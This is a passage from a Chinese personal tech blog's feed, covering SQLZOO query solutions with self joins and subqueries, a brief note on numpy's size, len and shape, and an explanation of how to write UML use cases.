plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT continent, MIN(name) AS name</span><br><span class="line">FROM world </span><br><span class="line">GROUP BY continent</span><br><span class="line">ORDER by continent</span><br></pre></td></tr></table></figure><p>错误👇但没明白为什么</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> continent, <span class="type">name</span></span><br><span class="line"><span class="keyword">from</span> world x</span><br><span class="line"><span class="keyword">where</span> <span class="type">name</span> = (<span class="keyword">select</span> <span class="type">name</span> <span class="keyword">from</span> world y</span><br><span class="line"><span class="keyword">where</span> x.continent = y.continent <span class="keyword">limit</span> <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="select-continent-that-all-the-countries-in-it-…"><a href="#select-continent-that-all-the-countries-in-it-…" class="headerlink" title="select continent that all the countries in it …"></a>select continent that all the countries in it …</h3><p><img src="/2021/some-representative-solutions-in-SQLZOO/image-20210720172628988.png" alt="image-20210720172628988"></p><p>其他答案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT name, continent, population FROM world WHERE continent IN (SELECT continent FROM world  x WHERE 25000000 &gt;&#x3D; (SELECT MAX(population) FROM world y WHERE x.continent &#x3D; y.continent));</span><br><span class="line">or</span><br><span class="line">SELECT y.name, y.continent, y.population</span><br><span class="line">FROM world AS y</span><br><span class="line">JOIN</span><br><span class="line">(SELECT continent,max(population)</span><br><span class="line">FROM world</span><br><span class="line">GROUP BY continent</span><br><span class="line">HAVING max(population) &lt;&#x3D; 25000000) AS x</span><br><span class="line">ON y.continent &#x3D; x.continent</span><br></pre></td></tr></table></figure><h3 id="bigger-than-any-of"><a href="#bigger-than-any-of" class="headerlink" title="bigger than any of"></a>bigger than any of</h3><p><img src="/2021/some-representative-solutions-in-SQLZOO/image-20210720183807201.png" alt="image-20210720183807201"></p><p>注意要加上 and x.name &lt;&gt; y.name，排除自己！</p><h3 id="compare-to-null"><a href="#compare-to-null" class="headerlink" title="compare to null"></a>compare to null</h3><p><img src="/2021/some-representative-solutions-in-SQLZOO/image-20210720223438816.png" alt="image-20210720223438816"></p><p>最后一个选项错误因为null不可以和其他值比较，只能够使用is null/is not null。</p><h3 id="where-and-having"><a href="#where-and-having" class="headerlink" title="where and having"></a>where and having</h3><p><img src="/2021/some-representative-solutions-in-SQLZOO/image-20210721135952709.png" alt="image-20210721135952709"></p><p>但这个做法会将符合要求的国家数为0的continent排除不显示，若要将这一类显示为0应该：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select x.continent, COALESCE(y.count,0)</span><br><span class="line">from </span><br><span class="line">(select continent from world group by continent) as x left join (</span><br><span class="line">    select continent, COUNT(name) as count</span><br><span class="line">    from world</span><br><span class="line">    where population &gt; 10000000</span><br><span class="line">    group by continent) as y</span><br><span class="line">on x.continent &#x3D; y.continent</span><br></pre></td></tr></table></figure><p>用自己和自己join后的表，加上COALESCE()来显示为null的值。</p><h3 id="complex-join"><a href="#complex-join" class="headerlink" title="complex join"></a>complex join</h3><p><img src="/2021/some-representative-solutions-in-SQLZOO/image-20210721190947124.png" alt="image-20210721190947124"></p><p>思路：</p><ol><li>需要展示的信息是title、leading actor name -&gt; 需要连接movie、actor、casting三张表</li><li>要求是’Julie Andrews’这个actor参演过的电影 -&gt; 子查询</li></ol><p>最后的数据表有点难理解，解释如下：</p><p><img src="/2021/some-representative-solutions-in-SQLZOO/image-20210725215153850.png" alt="image-20210725215153850"></p><p>先查看一下表的数据：</p><p><img src="/2021/some-representative-solutions-in-SQLZOO/image-20210726175647758.png" alt="image-20210726175647758"></p><blockquote><p>We got the name of the stop, the bus <em>number,</em> and the bus <em>company</em>. We learned from an earlier problem that we would usually refer to a bus by their num and company like ‘124 SMT’. So, by looking at our table we could assume that at the stop in Aberlady we can get the 124 SMT bus.</p></blockquote><p>pos这个字段有点儿难理解，它指的是这辆车走的路线中这个站的顺序（第几个到达的）。</p><p><img src="/2021/some-representative-solutions-in-SQLZOO/image-20210726175931308.png" alt="image-20210726175931308"></p><blockquote><p>If we order by the <em>num</em> then by <em>position</em>, we’ll see that the ‘1 LRT’ bus, for example, leaves from Leith then goes on a round trip until it gets back to Leith after stopping at 9 other stops. If we go down the table, we see that not all buses go on a round trip as they won’t always end up at the same stop where they started.</p></blockquote><p>最后一题的解析：<a href="https://zhuanlan.zhihu.com/p/77790284">SQLZOO-self join最后一题解析-复杂自联结应用（附加where判断条件的数组应用拓展）</a></p><p>另一篇解析（写得太好了）：<a href="https://hackernoon.com/learning-self-join-queries-with-sqlzoo-xc163ue7">Learning Self JOIN Queries With SQLZOO</a></p><h3 id="complex-self-join"><a href="#complex-self-join" class="headerlink" title="complex self join"></a>complex self join</h3><p><img src="/2021/some-representative-solutions-in-SQLZOO/image-20210721220204544.png"></p><p>列出从Craiglockhart到lochend的换乘选项，需要的5个内容分别是第一辆车号，哪家公司运营，换乘站，第二辆车号，哪家公司运营。</p><blockquote><p>In other words, we need to find the buses that stop at Craiglockhart and have stops in common with the buses that stop at Lochend. Because that’s where they can get off and change buses. </p></blockquote><p><img src="/2021/some-representative-solutions-in-SQLZOO/image-20210726181516286.png" alt="image-20210726181516286"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT v1.num,v1.company, name,v2.num,v2.company</span><br><span class="line">&#x2F;&#x2F; 找出经过Craiglockhart的车辆和其途径的其它站点集合v1(num,company,stop)</span><br><span class="line">FROM </span><br><span class="line">(SELECT r1.num ,r1.company ,r2.stop</span><br><span class="line">   FROM route AS r1 JOIN route AS r2 ON (r1.num&#x3D;r2.num </span><br><span class="line">   AND r1.company&#x3D;r2.company)JOIN stops ON r1.stop&#x3D;stops.id </span><br><span class="line">  WHERE stops.name&#x3D;&#39;Craiglockhart&#39;  AND r2.stop!&#x3D; r1.stop) AS v1 </span><br><span class="line"></span><br><span class="line">JOIN</span><br><span class="line">&#x2F;&#x2F; 找出经过Lochend的车辆和其途径的其它站点集合v2(num,company,stop)</span><br><span class="line">(SELECT r1.num,r1.company,r2.stop</span><br><span class="line">   FROM route AS r1 JOIN route AS r2 ON (r1.num&#x3D;r2.num AND</span><br><span class="line">r1.company&#x3D;r2.company)JOIN stops ON r1.stop&#x3D;stops.id </span><br><span class="line">  WHERE stops.name&#x3D;&#39;Lochend&#39;  AND r2.stop!&#x3D; r1.stop) AS v2 </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; v1和v2需要经过同一个站点作为周转站点</span><br><span class="line">ON v1.stop&#x3D;v2.stop</span><br><span class="line"></span><br><span class="line">JOIN stops ON v1.stop&#x3D;stops.id</span><br></pre></td></tr></table></figure><p>✌</p><p><img src="/2021/some-representative-solutions-in-SQLZOO/image-20210721220710111.png" alt="image-20210721220710111"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;SQLZOO是一个MySQL的在线练习平台，本文记录了其中的一些典型题目。&lt;/p&gt;</summary>
    
    
    
    <category term="MySQL" scheme="https://www.fvolcano.red/categories/MySQL/"/>
    
    
    <category term="笔记" scheme="https://www.fvolcano.red/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>python中关于大小的方法的使用：size、len、shape</title>
    <link href="https://www.fvolcano.red/2021/the-len-size-shape-function-in-python/"/>
    <id>https://www.fvolcano.red/2021/the-len-size-shape-function-in-python/</id>
    <published>2021-07-17T06:30:19.000Z</published>
    <updated>2021-07-17T06:30:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>numpy中的shape属性reshape方法刚开始确实会让人感到困惑。<a id="more"></a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://blog.csdn.net/songyunli1111/article/details/78079904">python中的size,shape,len,count</a></li><li><a href="https://blog.csdn.net/u010758410/article/details/71554224">python: numpy–函数 shape用法</a></li><li><a href="https://blog.csdn.net/qq_24193303/article/details/80961646">python 中 numpy 模块的 size,shape, len的用法</a></li><li><a href="https://www.jianshu.com/p/e083512e4f4c">numpy.shape()和.shape</a></li><li><a href="https://blog.csdn.net/xiaoqinting2015/article/details/69936952">Numpy.reshape函数解释</a></li><li><a href="https://zhuanlan.zhihu.com/p/72381219">numpy中的reshape函数详解</a></li></ol><p>len、count、size和shape的区分</p><p>​    shape：返回一个元组，从左到右分别是第一维度、第二维度…</p><p>reshape函数生成的新数组和原始数组公用一个内存，也就是说，不管是改变新数组还是原始数组的元素，另一个数组也会随之改变：</p><p><img src="/2021/the-len-size-shape-function-in-python/20170925125507504"></p><p>函数还是属性：shape()和shape</p><p>shape的(2,)和(2,1)有什么区别</p><p>​    一个是有两个元素的一维数组，一个是2*1的矩阵</p><p>reshape()怎么用</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;numpy中的shape属性reshape方法刚开始确实会让人感到困惑。&lt;/p&gt;</summary>
    
    
    
    <category term="python" scheme="https://www.fvolcano.red/categories/python/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>什么是use case</title>
    <link href="https://www.fvolcano.red/2021/what-is-use-case-and-how-to-write/"/>
    <id>https://www.fvolcano.red/2021/what-is-use-case-and-how-to-write/</id>
    <published>2021-07-13T03:57:01.000Z</published>
    <updated>2021-07-13T03:57:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>Use Case 是UML中的重要概念，本文介绍了它的含义及写法。<a id="more"></a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://www.jianshu.com/p/7ff70e28bb72">谈谈需求的描述-用例（Use Case）</a></li><li><a href="http://www.woshipm.com/pmd/932236.html">我们如何正确使用Use Case</a></li><li><a href="https://www.wikiwand.com/en/Use_case">wiki-Use case</a></li><li><a href="https://www.usability.gov/how-to-and-tools/methods/use-cases.html">Usability.gov-Use Cases</a></li><li><a href="https://www.visual-paradigm.com/guide/uml-unified-modeling-language/what-is-use-case-diagram/">What is Use Case Diagram?</a></li><li><a href="https://www.inflectra.com/ideas/topic/use-cases.aspx">Use Cases and Scenarios</a></li><li><a href="https://blog.csdn.net/u012829152/article/details/42005705">用例级别–用户用例，高层用例和子功能用例</a></li></ol><h1 id="Use-Case是什么"><a href="#Use-Case是什么" class="headerlink" title="Use Case是什么"></a>Use Case是什么</h1><p>Use Case（用例）是一个UML中非常重要的概念，在使用UML的整个软件开发过程中，Use Case处于一个中心地位，是UML规范中的一种标准化的需求表达方式，其中比较有名的RUP（Rational Unified Process）就是以用例来驱动的。在UML的文档中，Use Case的定义是：<strong>在不展现一个系统或子系统内部结构的情况下，对系统或子系统的某个连贯的功能单元的定义和描述</strong>。</p><p>怎么理解呢？Use Case就是对系统功能的描述，一个Use Case描述的是整个系统功能的一部分，这一部分一定要是在<strong>逻辑上相对完整的功能流程</strong>。</p><p>在使用UML的开发过程中，需求是用Use Case来表达的，界面是在Use Case的辅助下设计的，很多类是根据Use Case来发现的，测试实例是根据Use Case来生成的，包括整个开发的管理和任务分配，也是依据Use Case来组织的。</p><p>用例是一种描述需求的方法，用例描述了在不同的条件下，系统对参与者的请求做出的响应。用例通常通过一个参与者（Actor）（<em>谁？</em>）向系统做出请求，系统根据参与者的请求（<em>要做什么？</em>），在不同的条件下，执行某一行为序列（<em>系统怎么满足？</em>）。每一个行为序列可以称之为一个场景（Scenario），一个用例包含多个场景。场景也可以称之为用例的一个实例（Instance）。</p><blockquote><p>A <em>use case</em> is a list of actions or event steps typically defining the interactions between a role (known in the <a href="https://www.wikiwand.com/en/Unified_Modeling_Language">Unified Modeling Language</a> (UML) as an <em><a href="https://www.wikiwand.com/en/Actor_(UML)">actor</a></em>) and a system to achieve a goal. The actor can be a human or other external system. In systems engineering, use cases are used at a higher level than within <a href="https://www.wikiwand.com/en/Software_engineering">software engineering</a>, often representing missions or <a href="https://www.wikiwand.com/en/Project_stakeholder">stakeholder</a> goals.</p></blockquote><p>由于不少测试工程师将<a href="https://baike.baidu.com/item/%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B">测试用例</a>简称为用例，为便于区分两者，将原来的[Use case](<a href="https://baike.baidu.com/item/Use">https://baike.baidu.com/item/Use</a> case)用例称为需求用例。</p><h1 id="Use-Case的组成"><a href="#Use-Case的组成" class="headerlink" title="Use Case的组成"></a>Use Case的组成</h1><p>原文：参考资料1</p><p>正式的用例应该包括：用例名、概述、范围、级别、主参与者、项目相关人员和利益、前置条件、最小保证、成功保证、触发事件、主成功场景、扩展场景和相关信息等等。</p><p>各个组成部分的意义如下：</p><ul><li>用例名（Title）：&lt;*用例目标*&gt;</li><li>概述（Goal in Context）：&lt;*要描述用例流程和目标*&gt;</li><li>范围（Scope）：&lt;*设计范围*&gt;</li><li>级别（Level）：&lt;*概要、用户目标、子功能*&gt;</li><li>主执行者（Primary Actort）：&lt;*主执行者或角色*&gt;</li><li>项目相关人员和利益（Stakeholders and Interests）：&lt;*项目相关人和主要利益列表*&gt;</li><li>前置条件 （Precondition）：&lt;*已经达到的条件*&gt;</li><li>最小保证（Minimal Guarantees）：&lt;*用例必须执行的信息*&gt;</li><li>成功保证（Success Guarantees）：&lt;*目标完成时执行的信息*&gt;</li><li>触发事件（Trigger）：&lt;*触发了用例的事件*&gt;</li><li>主成功场景（Main Success Scenario）：&lt;*目标完成的主要步骤*&gt;</li><li>扩展（Extensions）：&lt;*可能出现的其他步骤，包括异常情况*&gt;</li></ul><h2 id="用例名（Title）"><a href="#用例名（Title）" class="headerlink" title="用例名（Title）"></a>用例名（Title）</h2><p>用例名用于标识一个用例，便于汇总和阅读。</p><p><strong>规则：使用主动语态的动宾短语来描述。</strong></p><p>一般情况下，建议使用主动语态的动宾短语来描述用例的目标。如：<em>“查找商品”</em>、<em>“加入购物车”</em>。在某些情况下，如需要更准确的表示出一个用例，可以加入定语进行修饰，如：<em>“用户清除购物车”</em>、<em>“管理员清除购物车”</em>。</p><p><strong>规则：以主参与者为对象进行描述。</strong></p><p>用例的描述需要以主参与者为对象进行描述，如可以使用<em>“支付订单”</em>（以主参与者为对象），而不是<em>“收取订单费用”</em>(以系统为对象)。</p><h2 id="范围（Scope）"><a href="#范围（Scope）" class="headerlink" title="范围（Scope）"></a>范围（Scope）</h2><p>用例的范围能让我们对系统的边界和讨论的需求有一个基础的语境，不同的设计范围可能会导致我们需要讨论的参与者、场景都会不一样。简单来讲，就是为我们讨论的系统划定一个范围确定我们讨论的界线。</p><p>例如我们要讨论一个用户的下单行为。如果以整个企业为范围，其项目的相关人员为用户、第三方服务者（如快递等）。但如果以系统为范围，其项目相关人员还应该包括企业内部的系统管理员、客服等。</p><p>所以，在编写用例时需要搞清楚，我们的用例的范围是什么，这样可以对用例讨论的问题达成一个共识。</p><h3 id="功能范围"><a href="#功能范围" class="headerlink" title="功能范围"></a>功能范围</h3><p>在讨论用例的设计范围时，需要先确定系统的功能范围。Cockburn在《编写有效用例》里面推荐了一个确定功能范围的方式<em>“内/外列表”</em>。</p><table><thead><tr><th align="center">主题</th><th align="center">内</th><th align="center">外</th></tr></thead><tbody><tr><td align="center">查询商品</td><td align="center">内</td><td align="center"></td></tr><tr><td align="center">打印订单</td><td align="center"></td><td align="center">外</td></tr><tr><td align="center">加入购物车</td><td align="center">内</td><td align="center"></td></tr><tr><td align="center">订单管理</td><td align="center">内</td><td align="center"></td></tr><tr><td align="center">跟踪物流路径</td><td align="center"></td><td align="center">外</td></tr></tbody></table><p>确定功能范围的好处是显而易见。如，系统外部已经有了一个打印订单的系统，如果不明确区分系统的功能范围，部分开发人员有可能会对打印订单功能进行设计和实现。而事实上，这些功能是不需要设计的。</p><p>明确了功能范围后，还可以确认系统的执行人员。如上面的例子，打印订单系统将作为<em>“打印订单”</em>用例的辅助执行者。</p><h3 id="设计范围"><a href="#设计范围" class="headerlink" title="设计范围"></a>设计范围</h3><p>设计范围是在功能范围确定了之后做的。设计范围指的是我们在编写用例时讨论问题的边界和对象。我们在用例里面说的范围（Scope）如果没有特殊说明指的就是设计范围（而不是功能范围）。</p><p>下面来看一个例子，ECom公司打算做一个ESys的系统，系统里面包括了ESubSys等多个子系统。</p><p><img src="https://upload-images.jianshu.io/upload_images/422470-eebad04ef1658151.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/860/format/webp" alt="设计范围的大小"></p><p>如果以ECom为设计范围来讨论用例，我们关心的是用户对公司的需求是什么，公司以什么样的形式满足用户的请求。如果有外部公司，则还要考虑外部公司与公司之间往来的业务是什么。</p><p>如果以ESys为设计范围来讨论用例，我们更关心用户向系统发起的请求和系统对请求的响应。同时，如果以ESys做范围的时候，企业内部的员工也成了用例的执行者，我们还应该考虑员工对系统的请求。</p><p>确定用例范围，能很好的对其我们要讨论的问题是什么，界定我们讨论问题的范围，给用例一个语言环境。</p><p><strong>规则：设计范围是一个简单的专有名称。</strong></p><p>用例的范围应该是一个简单的专用名词，如“电商系统”，简单说明一下用例讨论的范围界线。如，上面的例子中范围可以直接用<em>“ECom”</em>、<em>“ESys”</em>、<em>“ESubSys”</em>来表示。</p><h2 id="主执行者（Primary-Actor）"><a href="#主执行者（Primary-Actor）" class="headerlink" title="主执行者（Primary Actor）"></a>主执行者（Primary Actor）</h2><p>主执行者是系统相关人员中，请求系统做出响应的人或物。主执行者是对系统请求的发起者，可是<strong>主执行者可以不是直接操作系统的相关人员</strong>。</p><p>其中一种情况下是主执行者通过另一个系统操作相关人员对系统进行操作。如，客户致电客服查询异常订单的场景。客户并没有直接通过系统进行查询。</p><p>另一种情况是定时触发任务。如客户希望系统定时执行一个任务，那么最终执行系统的相关人员是系统本身。</p><p>虽然识别出主执行者很重要，可是在有些时候<strong>主执行者也没那么重要</strong>。</p><p>在编写用例时，识别出主执行者，可以从执行者角度出发，充分梳理系统需求。我们还可以主执行者的特点来设计系统的交互。如下表，主执行者概括表：</p><table><thead><tr><th align="center">名称</th><th align="left">概况：技能和背景</th></tr></thead><tbody><tr><td align="center">客户</td><td align="left">了解电脑软件的操作，对基本的系统软件有操作经验。</td></tr><tr><td align="center">管理员</td><td align="left">熟悉通用的软件，能解决做日常的系统维护。但是不懂编程。</td></tr><tr><td align="center">经理</td><td align="left">能进行简单的电脑操作，对界面呈现要求高，缺乏多步骤操作耐心。</td></tr><tr><td align="center">……</td><td align="left">……</td></tr></tbody></table><p>在多数情况下，我们开始编写用例开始后，主执行者就变得没那么重要了。例如，当我们在设计查询订单用例时，无论是管理员、经理、客服甚至是其他的公司职位，在查询订单这个用例上并没有特别的差异。这个时候，主执行者具体是谁已经不重要了。</p><p><strong>规则：用例的主执行者可以是执行者或者执行者角色。</strong></p><p>在上述情况下，我们会将部分主执行者一般化的方式，创建一个<em>“角色-执行者对应表”</em>。在上述用例里，我们将管理员、经理等一般化为一个操作角色——订单管理者。我们在描写用例时，以角色作为主执行者即可。</p><blockquote><p>【举例】</p><p><strong>用例1：购买商品</strong><br> 主执行者：用户<br> 范围：电商系统<br> ……</p></blockquote><h3 id="概述（Goal-in-Context）"><a href="#概述（Goal-in-Context）" class="headerlink" title="概述（Goal in Context）"></a>概述（Goal in Context）</h3><p>概述主要用于描述用例的目标，也就是用户需要完成的目标。</p><p><strong>规则：使用自然语言描述。</strong></p><p>尽量使用自然的语言阐述用户要完成目标时，用户会做什么事情。</p><p><strong>规则：描述用例实现什么，而不描述系统步骤。</strong></p><p>只需要讲清楚用例需要完成的事情即可，这里不需要描述系统步骤或者用户的具体操作流程。</p><p>如：<em>“用户选择一件需要购买的商品后，可以将商品加入购物车，然后在购物车里面提交订单。用户也可以不需要加入购物车，直接购买选中的商品。”</em>概述并不需要描述具体的系统操作，在这里并没有描述<em>“点击加入购物车按钮”</em>等系统的操作细节。</p><blockquote><p>【举例】</p><p><strong>用例1：购买商品</strong><br> 主执行者：用户<br> 概述：用户选中商品后，通过系统下订单购买商品并支付货款。不包括管理员处理订单。<br> 范围：电商系统<br> ……</p></blockquote><h2 id="相关人员和利益（Stakeholders-and-Interests）"><a href="#相关人员和利益（Stakeholders-and-Interests）" class="headerlink" title="相关人员和利益（Stakeholders and Interests）"></a>相关人员和利益（Stakeholders and Interests）</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>项目的相关人员是指对系统有特定利益的参与者。相关人员不一定是人，也可以是一个外部系统、一个组织等。</p><p>所以能成为项目相关人员的有可能是：</p><ul><li>使用或关注系统的外部人或物。</li><li>用例的主执行者。</li><li>用例的辅助执行者。</li><li>系统内部执行者。</li><li>被设计的系统本身。</li></ul><p><strong>主执行者</strong></p><p>主执行者是发起执行用例的相关人员。</p><p><strong>辅助执行者</strong></p><p>辅助执行者是为被设计的系统执行服务的的外部执行人员。辅助执行者可以是另外一个系统、也可以是一个人或组织。如，一台打印机，为系统打印各种票据。再如，快递公司，为系统提供快递服务，并提供物流信息。</p><p><strong>内部执行者</strong></p><p>内部执行者是在系统内部关注系统利益的相关人员。</p><p><strong>被设计的系统</strong></p><p>被设计的系统本身有时候对自己也是有特定利益的。</p><p>对于相关人员，有几点需要说明：</p><ol><li>系统相关人员有可能不直接和系统交互。<br> 例如，公司管理者，可能不会亲自操作系统，可是对系统运行的状况和其他运营数据却是十分关注的。这些相关人员在系统操作步骤中可能不会出现，但是用例还是需要描述对这部分相关人员的利益。</li><li>关注“沉默的”相关人员。<br> 系统相关人员有时候并不是那么明显。比如上文提到的，有些相关人员并不是直接操作系统的人员。往往是这些<em>“沉默”</em>的相关人员考虑不足，正是系统后期需求频繁改动的原因之一。</li></ol><p><strong>规则：相关人员和利益用以对应列表的方式书写。</strong></p><p>使用”<em>&lt;相关人员&gt;：&lt;利益&gt;</em>“的方式，描写相关人员和其关注的利益。</p><blockquote><p>【举例】</p><p><strong>用例1：购买商品</strong><br> 主执行者：用户<br> 概述：用户选中商品后，通过系统下订单购买商品并支付货款。不包括管理员处理订单。<br> 范围：电商系统<br> ……<br> 项目相关人员和利益：<br> 用户：希望通过系统下订单购买需要他需要的商品。<br> 系统：记录用户购买的订单，以便给订单管理员处理。<br> ……</p></blockquote><h2 id="级别（Level）"><a href="#级别（Level）" class="headerlink" title="级别（Level）"></a>级别（Level）</h2><p>在编写用例过程中，我们有时会具体描述一个用户的需求（如用户购买商品），有时候会描述一个系统的具体功能（如用户登陆），有时候会描述一个流程（如购买商品并获得商品的流程）。在编写用例的时候，知道用例所处的位置，对我们编写和理解用例有很大的帮助。</p><p>我们将用例级别从总到分划分成了三个层次：概要、用户目标、子功能。</p><h3 id="用户目标"><a href="#用户目标" class="headerlink" title="用户目标"></a>用户目标</h3><p>用户目标是指主执行者使用系统期望获得的目标。用户目标是我们编写用例的重点。用户目标描述了主执行者通过系统<em>“做一件什么事”</em>，以及做完这件事后<em>“用户能获取什么利益”</em>。</p><p>用户目标应该是主执行者一次执行系统获取利益的过程。所以，不是一次执行所能完成的目标，或者用户不能获得利益的需求不能称为用户目标。</p><p>如，购买一个商品的流程，这个从下订单到快递需要几天的过程，所以不能称为一个用户目标。再如，用户登陆，用户登陆并不能获取什么利益，所以也不能称为一个用户目标。用户下单这个操作，可以作为一个用户目标。</p><h3 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h3><p>概要层次可以包含多个用户目标，概要目标执行周期比用户目标更长，可以是一个几天、几个月甚至更长的过程。概要目标有三个目的：</p><ul><li>为用户目标提供一个运行的语境。如，明确用户目标是在讨论下单流程。</li><li>显示用户目标之间的前后顺序。如，明确下单用例、查询快递用例、签收订单用例之间的前后顺序。</li><li>作为多个用户目标的汇总。如，下单流程汇总了多个相关的用户目标。</li></ul><h3 id="子功能"><a href="#子功能" class="headerlink" title="子功能"></a>子功能</h3><p>子功能层次是用户目标在执行过程中会执行到的目标。如，一次登陆，一次订单打印等。也有可能存在多个用户目标共用一个子功能，如查找商品、查找订单等。</p><p>子功能用例的存在是为了用户目标用例增加可读性而存在的。在实际编写过程中，<strong>不到迫不得已，不要设计子功能层出用例</strong>。</p><p><strong>规则：层次只有三个选项：概要、用户目标、子功能。</strong></p><p>用例的层次只能是概要、用户目标、子功能三个之中的一个层次。</p><blockquote><p>【举例】</p><p><strong>用例1：购买商品</strong><br> 主执行者：用户<br> 概述：用户选中商品后，通过系统下订单购买商品并支付货款。不包括管理员处理订单。<br> 范围：电商系统<br> 级别：用户目标<br> 项目相关人员和利益：<br> 用户：希望通过系统下订单购买需要他需要的商品。<br> 系统：记录用户购买的订单，以便给订单管理员处理。<br> ……</p></blockquote><p>用例级别指的是我们对用例模型的抽象和细化程度；在《编写有效用例》一书中，将由高到低的不同用例级别形象地比喻为云朵和风筝，海平面，海平面以下的鱼虾等自然界的事务：</p><p><img src="/2021/what-is-use-case-and-how-to-write/20141218150332796"></p><h2 id="前置条件（Precondition）"><a href="#前置条件（Precondition）" class="headerlink" title="前置条件（Precondition）"></a>前置条件（Precondition）</h2><p>前置条件是我们在用例执行之前期望必须成功的条件。在用例编写过程中，可以不对该条件进行检查和讨论。如，<em>“下订单”</em>必须依赖于<em>“用户已经登陆”</em>这个前置条件。</p><p><strong>规则：前置条件必须是用例执行前我们期望一定成功的条件。</strong></p><p>要预防将那些并不是必须条件的条件写入前置条件。如，取消订单并不依赖于用户下单成功，事实上，用户可以将下单不成功（例如支付失败）的订单取消掉。而订单下单是否成功这个条件是需要在用例里面对这个条件进行检查并执行不通过动作的。</p><blockquote><p>【举例】</p><p><strong>用例1：购买商品</strong><br> 主执行者：用户<br> 概述：用户选中商品后，通过系统下订单购买商品并支付货款。不包括管理员处理订单。<br> 范围：电商系统<br> 级别：用户目标<br> 项目相关人员和利益：<br> 用户：希望通过系统下订单购买需要他需要的商品。<br> 系统：记录用户购买的订单，以便给订单管理员处理。<br> 前置条件：用户已经登陆系统。<br> ……</p></blockquote><h2 id="最小保证（Minimal-Guarantees）"><a href="#最小保证（Minimal-Guarantees）" class="headerlink" title="最小保证（Minimal Guarantees）"></a>最小保证（Minimal Guarantees）</h2><p>最小保证是用例执行无论是否成功都会被执行的保证。虽然，用例无论执行成功与否，最小保证总会被执行。但是，最小保证更多的是为用例执行失败情况下，为用例相关人员提供的利益保证。最小保证可以有多个。</p><p>一个常见的最小保证例子是<em>“系统将用户执行记录日志”</em>，就算用例执行失败，用户的操作也将会被记录到日志里面。</p><blockquote><p>【举例】</p><p><strong>用例1：购买商品</strong><br> 主执行者：用户<br> 概述：用户选中商品后，通过系统下订单购买商品并支付货款。不包括管理员处理订单。<br> 范围：电商系统<br> 级别：用户目标<br> 项目相关人员和利益：<br> 用户：希望通过系统下订单购买需要他需要的商品。<br> 系统：记录用户购买的订单，以便给订单管理员处理。<br> 前置条件：用户已经登陆系统。<br> 最小保证：系统记录用户操作进度的日志。<br> ……</p></blockquote><h2 id="成功保证（Success-Guarantees）"><a href="#成功保证（Success-Guarantees）" class="headerlink" title="成功保证（Success Guarantees）"></a>成功保证（Success Guarantees）</h2><p>成功保证是指用例执行成功后，用户所能得到的利益保证。相关人员的利益能否得到保证，是用例执行成功的判定条件。成功保证可以有多个。</p><p>例如，在下订单用例中，用户下单成功后，必须保证<em>“订单被创建，并提交到后台处理。”</em></p><blockquote><p>【举例】</p><p><strong>用例1：购买商品</strong><br> 主执行者：用户<br> 概述：用户选中商品后，通过系统下订单购买商品并支付货款。不包括管理员处理订单。<br> 范围：电商系统<br> 级别：用户目标<br> 项目相关人员和利益：<br> 用户：希望通过系统下订单购买需要他需要的商品。<br> 系统：记录用户购买的订单，以便给订单管理员处理。<br> 前置条件：用户已经登陆系统。<br> 最小保证：系统记录用户操作进度的日志。<br> 成功保证：<br> \1. 系统成功创建用户订单。<br> \2. 系统收到用户支付货款。<br> \3. 用户的订单操作和付款信息被记录成日志。<br> ……</p></blockquote><h2 id="触发事件（Trigger）"><a href="#触发事件（Trigger）" class="headerlink" 